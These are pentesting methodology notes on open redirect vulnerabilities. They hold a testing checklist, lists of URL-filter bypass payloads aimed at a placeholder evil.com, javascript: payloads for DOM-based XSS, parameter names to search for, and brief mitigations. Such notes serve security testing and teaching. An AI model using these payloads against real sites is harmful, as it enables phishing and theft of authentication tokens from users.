---
title: "Open Redirect"
layout: notes
tags:
  - webapp
  - methodology
  - open-redirect
  - FI_parameters
  - Co_phishing
  - Co_sensitive-info-disclosure
  - FI_http-headers
  - Co_arbitrary-script-execution
---
## Summary

Where sites need to direct a user to a different page or to another site, they will use some sort of a redirect. In application this is incredibly useful when a user might need to be directed through a chain of events then sent back to their original destination. Especially in cases where a service handles a login function then returns the user with an authentication token of some kind like in Oauth. In these cases it might be possible to abuse the redirect and send the intended token to an attacker controlled webpage. Redirects might have some filters but can be easy to bypass as their impact is often overlooked.

## Methodology

When looking for Open Redirects ask/try the following:
- [ ] **Do login/register/logout pages redirect?**
- [ ] **Is there any redirect found within the source code?**
	- [ ] **Is the location header missing?** or **Are you changing the DOM?**
		- [ ] try to pop an XSS - JavaScript Injection from the open redirect
- [ ] try changing the domain
	- [ ] try adding a whitelisted domain/keyword
- [ ] try adding another domain after with `redirect.com/a//evil.com`
- [ ] try using `//` to bypass `http` filter
	- [ ] try using `https:` to bypass `//`
	- [ ] try using `\\` to bypass `//`
	- [ ] try using `\/\/` to bypass `//`
- [ ] try using `%E3%80%82` to bypass `.`
- [ ] try using `%00` in domain `/?redir=//evil%00.com`
- [ ] try using `@` or `%40` to redirect
	- [ ] `/?redir=target.com@evil.com`
- [ ] try making a directory inside of your domain matching the domain in question
- [ ] try using `#` after your site to ignore theirs
- [ ] try using `%23` for simple filters `/?redir=target.com%23evil.com`
- [ ] try using parsing `http://ⓔⓥⓘⓛ.ⓒⓞⓜ`
- [ ] if it only lets you control a path bypass with `%0d` or `%0a` `/?redir=/%0d/evil.com`
- [ ] IF NO RESULTS TRY A BASIC SUBDOMAIN OF THE CORRECT DOMAIN
	- [ ] if even this isn't allowed there is a good chance it's properly configured

## Capabilities

Execution of arbitrary scripts  
Phishing attacks  
Disclosure of sensitive information  

## Found In

HTTP Headers  
Parameters  
	Sign in and register pages  
	Signout application route/API endpoint  
	Password resets  
	Profile account page  
	Email verification links  
	Error pages  
	Multistep actions in the application  


## Tools/Examples

[https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

bypasses to determine filter
```
\/evil.com
\/\/evil.com
\\evil.com
//evil.com
//target.com@evil.com
/\/evil.com
/+/evil.com
https://evil.com%3F.target.com/
https://evil.com%2523.target.com/
https://evil.com?c=.target.com/ (use # \ also)
//%2F/evil.com
////evil.com
///evil.com
https://target.computer/
https://target.com.evil.com
/%0D/evil.com (Also try %09 %00 %0a %07 %2F)
https://evil.com%23example.com (Also try %00 %0a %0d %09 °)
/%5Cevil.com
//evil%E3%80%82com
.evil.com
http:evil.com
https:evil.com
```

DOM based XSS through open redirect 
```
# Simple bypasses
javascript:alert(1)
JavaScript:alert(1)
JAVASCRIPT:alert(1)

# Bypass weak regex patterns (try repositioning the URL-encoded special characters)
ja%20vascri%20pt:alert(1)
jav%0Aascri%0Apt:alert(1)
jav%0Dascri%0Dpt:alert(1)
jav%09ascri%09pt:alert(1)

# More advanced weak regex pattern bypasses
%19javascript:alert(1)
javascript://%0Aalert(1)
javascript://%0Dalert(1)
javascript://https://example.com%0Aalert(1)
```

dorkable endpoints on target (test upper and lower case)
```
return
return_url
rUrl
cancelUrl
url
redirect
follow
goto
returnTo
returnUrl
r_url
history
goback
redirectTo
redirectUrl
redirUr
```

#### Mitigation

Avoid using redirects when not necessary  
Validate the redirect URL by using a whitelist  
Do not allow user input for the redirect  
Show warnings when redirected to different domains  
